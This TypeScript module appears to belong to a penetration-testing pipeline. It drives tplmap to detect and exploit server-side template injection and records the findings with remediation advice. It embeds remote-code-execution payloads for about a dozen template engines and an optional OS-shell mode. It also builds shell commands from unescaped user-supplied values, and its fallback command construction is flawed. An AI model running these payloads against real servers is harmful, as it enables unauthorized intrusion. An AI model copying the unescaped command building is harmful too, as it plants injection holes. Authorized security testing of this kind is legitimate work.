/**
 * tplmap Scanner Module
 *
 * Dedicated Server-Side Template Injection (SSTI) detection and exploitation tool:
 * - Automated detection of SSTI in 15+ template engines (Jinja2, Twig, Mako, Smarty,
 *   Freemarker, Velocity, Pebble, Jade/Pug, Slim, ERB, Tornado, Nunjucks, Dust, Marko, EJS)
 * - Engine fingerprinting via polyglot probes ({{7*7}}, ${7*7}, #{7*7}, <%= 7*7 %>)
 * - Automatic exploitation: file read, file write, OS command execution, reverse shell
 * - Blind SSTI detection via time-based and OOB techniques
 * - Support for GET, POST, cookie, and header injection points
 *
 * Execution: SSH → scan server → tplmap → text output → parse → scan_results
 *
 * tplmap fills the SSTI gap that no other tool in the pipeline covers.
 * SQLMap handles SQLi, Commix handles command injection, tplmap handles template injection.
 */
import { executeTool, type ToolExecResult } from "../scan-server-executor";
import { getDb } from "../../db";
import { webAppFindings } from "../../../drizzle/schema";
import { mapToMitre } from "../zap-scanner";

// ─── Types ──────────────────────────────────────────────────────────────────────

export interface TplmapConfig {
  /** Target URL with injectable parameter */
  targetUrl: string;
  /** Engagement ID for audit trail */
  engagementId: number;
  /** HTTP method */
  method?: "GET" | "POST";
  /** POST data for POST requests */
  postData?: string;
  /** Cookie string for authenticated scanning */
  cookie?: string;
  /** Custom headers */
  headers?: Record<string, string>;
  /** Specific template engine to test (auto-detect if not set) */
  engine?: string;
  /** Timeout per URL in seconds */
  timeoutSeconds?: number;
  /** Enable OS shell access attempt on confirmed SSTI */
  osShell?: boolean;
  /** Level of code evaluation (1=basic, 2=advanced) */
  level?: 1 | 2;
}

export interface TplmapFinding {
  type: "ssti" | "blind_ssti" | "info";
  severity: "critical" | "high" | "medium" | "info";
  title: string;
  url: string;
  parameter?: string;
  engine?: string;
  payload?: string;
  osOutput?: string;
  rawOutput?: string;
  capabilities?: string[];
}

export interface TplmapScanResult {
  targetUrl: string;
  findings: TplmapFinding[];
  stats: {
    durationSeconds: number;
    parametersTestedCount: number;
    injectionsFound: number;
    engineDetected: string | null;
    capabilitiesFound: string[];
  };
  rawOutput: string;
  exitCode: number;
  timedOut: boolean;
}

// ─── Template Engine Knowledge ──────────────────────────────────────────────────

export const TEMPLATE_ENGINE_SIGNATURES: Record<string, { probes: string[]; languages: string[] }> = {
  jinja2:     { probes: ["{{7*7}}", "{{config}}", "{{self.__class__}}"], languages: ["Python"] },
  twig:       { probes: ["{{7*7}}", "{{_self.env.display('id')}}"], languages: ["PHP"] },
  mako:       { probes: ["${7*7}", "<%import os%>${os.popen('id').read()}"], languages: ["Python"] },
  smarty:     { probes: ["{7*7}", "{php}echo 'test';{/php}"], languages: ["PHP"] },
  freemarker: { probes: ["${7*7}", "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}"], languages: ["Java"] },
  velocity:   { probes: ["#set($x=7*7)$x", "#set($rt=$x.class.forName('java.lang.Runtime'))"], languages: ["Java"] },
  pebble:     { probes: ["{{7*7}}", "{% set cmd = 'id' %}"], languages: ["Java"] },
  erb:        { probes: ["<%= 7*7 %>", "<%= system('id') %>"], languages: ["Ruby"] },
  slim:       { probes: ["= 7*7", "= system('id')"], languages: ["Ruby"] },
  tornado:    { probes: ["{{7*7}}", "{% import os %}{{os.popen('id').read()}}"], languages: ["Python"] },
  nunjucks:   { probes: ["{{7*7}}", "{{range.constructor('return global.process.mainModule.require(\"child_process\").execSync(\"id\")')()}}"], languages: ["JavaScript"] },
  ejs:        { probes: ["<%= 7*7 %>", "<%= global.process.mainModule.require('child_process').execSync('id') %>"], languages: ["JavaScript"] },
  dust:       { probes: ["{@math key=\"7\" method=\"multiply\" operand=\"7\" /}"], languages: ["JavaScript"] },
  jade:       { probes: ["#{7*7}", "- var x = global.process.mainModule.require('child_process').execSync('id')"], languages: ["JavaScript"] },
};

// ─── Core Scanner ───────────────────────────────────────────────────────────────

function buildTplmapCommand(config: TplmapConfig): string {
  const parts: string[] = [];

  // tplmap might be at /opt/tplmap/tplmap.py or in PATH
  parts.push("python3 /opt/tplmap/tplmap.py 2>/dev/null || tplmap");

  parts.push(`-u "${config.targetUrl}"`);

  if (config.method === "POST" && config.postData) {
    parts.push(`-d "${config.postData}"`);
  }

  if (config.cookie) parts.push(`-c "${config.cookie}"`);

  if (config.headers) {
    for (const [key, value] of Object.entries(config.headers)) {
      parts.push(`-H "${key}: ${value}"`);
    }
  }

  if (config.engine) parts.push(`-e ${config.engine}`);

  // Level of code evaluation
  if (config.level) parts.push(`--level ${config.level}`);

  // Attempt OS shell if confirmed
  if (config.osShell) parts.push("--os-shell");

  // Force non-interactive
  parts.push("--force-overwrite");

  return parts.join(" ");
}

function parseTplmapOutput(output: string, targetUrl: string): TplmapFinding[] {
  const findings: TplmapFinding[] = [];
  const lines = output.split("\n");
  let detectedEngine: string | null = null;
  const capabilities: string[] = [];

  for (const line of lines) {
    const trimmed = line.trim();

    // Engine detection
    const engineMatch = trimmed.match(/confirmed\s+injection.*?['"]([^'"]+)['"]\s+with\s+['"]([^'"]+)['"]\s+engine/i) ||
                        trimmed.match(/injection\s+point.*?engine:\s*(\w+)/i) ||
                        trimmed.match(/template\s+engine:\s*(\w+)/i) ||
                        trimmed.match(/identified\s+['"]?(\w+)['"]?\s+(?:template\s+)?engine/i);
    if (engineMatch) {
      detectedEngine = engineMatch[2] || engineMatch[1];
    }

    // Confirmed SSTI
    if (/injectable/i.test(trimmed) || /injection\s+(?:has\s+been\s+)?confirmed/i.test(trimmed) ||
        /template\s+injection.*?found/i.test(trimmed)) {
      const paramMatch = trimmed.match(/parameter\s+['"]([^'"]+)['"]/i) ||
                         trimmed.match(/['"]([^'"]+)['"]\s+(?:is\s+)?injectable/i);
      findings.push({
        type: "ssti",
        severity: "critical",
        title: `[tplmap] SSTI Confirmed: ${paramMatch?.[1] || 'unknown param'}${detectedEngine ? ` (${detectedEngine} engine)` : ''}`,
        url: targetUrl,
        parameter: paramMatch?.[1],
        engine: detectedEngine || undefined,
        rawOutput: trimmed,
        capabilities: [...capabilities],
      });
    }

    // Blind SSTI detection
    if (/blind.*injection/i.test(trimmed) || /time-based.*injection/i.test(trimmed)) {
      const paramMatch = trimmed.match(/['"]([^'"]+)['"]/);
      findings.push({
        type: "blind_ssti",
        severity: "critical",
        title: `[tplmap] Blind SSTI Detected: ${paramMatch?.[1] || 'unknown param'}${detectedEngine ? ` (${detectedEngine})` : ''}`,
        url: targetUrl,
        parameter: paramMatch?.[1],
        engine: detectedEngine || undefined,
        rawOutput: trimmed,
      });
    }

    // Capability detection
    if (/shell\s+command\s+execution/i.test(trimmed) || /os.*command.*execution/i.test(trimmed)) {
      capabilities.push("os_command_execution");
    }
    if (/file\s+read/i.test(trimmed) || /read.*file/i.test(trimmed)) {
      capabilities.push("file_read");
    }
    if (/file\s+write/i.test(trimmed) || /write.*file/i.test(trimmed)) {
      capabilities.push("file_write");
    }
    if (/bind\s+shell/i.test(trimmed) || /reverse\s+shell/i.test(trimmed)) {
      capabilities.push("reverse_shell");
    }
    if (/code\s+evaluation/i.test(trimmed)) {
      capabilities.push("code_evaluation");
    }

    // OS output proof
    if (/^\s*(uid=\d+|root:|www-data:|Linux\s|Windows\s)/i.test(trimmed)) {
      if (findings.length > 0) {
        findings[findings.length - 1].osOutput = trimmed;
        findings[findings.length - 1].payload = trimmed;
      }
    }
  }

  // Update capabilities on all findings
  if (capabilities.length > 0) {
    for (const f of findings) {
      f.capabilities = [...new Set([...(f.capabilities || []), ...capabilities])];
    }
  }

  return findings;
}

export async function runTplmapScan(config: TplmapConfig): Promise<TplmapScanResult> {
  const startTime = Date.now();
  const timeout = config.timeoutSeconds || 120;
  const command = buildTplmapCommand(config);

  let result: ToolExecResult;
  try {
    result = await executeTool({
      tool: "tplmap",
      command,
      timeout,
      engagementId: config.engagementId,
    });
  } catch (err: any) {
    return {
      targetUrl: config.targetUrl,
      findings: [],
      stats: { durationSeconds: (Date.now() - startTime) / 1000, parametersTestedCount: 0, injectionsFound: 0, engineDetected: null, capabilitiesFound: [] },
      rawOutput: `Error: ${err.message}`,
      exitCode: -1,
      timedOut: false,
    };
  }

  const output = result.stdout + "\n" + result.stderr;
  const findings = parseTplmapOutput(output, config.targetUrl);
  const engineMatch = output.match(/engine:\s*(\w+)/i) || output.match(/identified\s+['"]?(\w+)['"]?\s+engine/i);
  const allCapabilities = [...new Set(findings.flatMap(f => f.capabilities || []))];

  return {
    targetUrl: config.targetUrl,
    findings,
    stats: {
      durationSeconds: (Date.now() - startTime) / 1000,
      parametersTestedCount: 1,
      injectionsFound: findings.filter(f => f.type === "ssti" || f.type === "blind_ssti").length,
      engineDetected: engineMatch?.[1] || null,
      capabilitiesFound: allCapabilities,
    },
    rawOutput: output.slice(0, 10000),
    exitCode: result.exitCode ?? 0,
    timedOut: result.timedOut || false,
  };
}

export async function batchTplmapScan(
  urls: Array<{ url: string; method?: string; params?: string[] }>,
  config: {
    engagementId: number;
    cookie?: string;
    timeoutSeconds?: number;
    level?: 1 | 2;
    engine?: string;
  }
): Promise<TplmapScanResult[]> {
  const results: TplmapScanResult[] = [];

  // Limit to top 10 URLs to avoid excessive scanning
  const targetUrls = urls.slice(0, 10);

  for (const target of targetUrls) {
    try {
      const result = await runTplmapScan({
        targetUrl: target.url,
        engagementId: config.engagementId,
        cookie: config.cookie,
        timeoutSeconds: config.timeoutSeconds || 90,
        level: config.level || 2,
        engine: config.engine,
      });
      results.push(result);

      if (result.stats.injectionsFound > 0) {
        console.log(`[tplmap] CONFIRMED: ${result.stats.injectionsFound} SSTI on ${target.url} (engine: ${result.stats.engineDetected || 'unknown'})`);
      }
    } catch (err: any) {
      console.warn(`[tplmap] Error scanning ${target.url}: ${err.message}`);
      results.push({
        targetUrl: target.url,
        findings: [],
        stats: { durationSeconds: 0, parametersTestedCount: 0, injectionsFound: 0, engineDetected: null, capabilitiesFound: [] },
        rawOutput: `Error: ${err.message}`,
        exitCode: -1,
        timedOut: false,
      });
    }
  }

  return results;
}

export async function ingestTplmapToWebAppFindings(
  results: TplmapScanResult[],
  engagementId: number,
  hostname: string
): Promise<{ findingsIngested: number }> {
  const db = await getDb();
  if (!db) return { findingsIngested: 0 };

  let ingested = 0;
  for (const result of results) {
    for (const finding of result.findings) {
      if (finding.type !== "ssti" && finding.type !== "blind_ssti") continue;

      try {
        const mitre = mapToMitre("Template Injection", finding.title);
        const capStr = finding.capabilities?.length ? `\nCapabilities: ${finding.capabilities.join(", ")}` : "";
        await db.insert(webAppFindings).values({
          engagementId,
          hostname,
          findingType: "template_injection",
          severity: finding.severity,
          title: finding.title,
          description: `Server-Side Template Injection (SSTI) found via tplmap.\nParameter: ${finding.parameter || 'unknown'}\nEngine: ${finding.engine || 'unknown'}${capStr}\nURL: ${finding.url}`,
          url: finding.url,
          parameter: finding.parameter || null,
          evidence: finding.rawOutput?.slice(0, 4000) || null,
          payload: finding.payload || null,
          remediation: "Never pass user input directly into template rendering. Use template engines in sandboxed mode. Implement strict input validation and output encoding. Consider using logic-less templates (Mustache) for user-controlled content.",
          tool: "tplmap",
          confidence: finding.type === "ssti" ? "confirmed" : "firm",
          mitreAttackId: mitre?.attackId || "T1059",
          mitreAttackName: mitre?.attackName || "Command and Scripting Interpreter",
          cweId: "CWE-1336",
          cweName: "Server-Side Template Injection",
          falsePositive: false,
        });
        ingested++;
      } catch (err: any) {
        console.warn(`[tplmap] Failed to ingest finding: ${err.message}`);
      }
    }
  }

  return { findingsIngested: ingested };
}
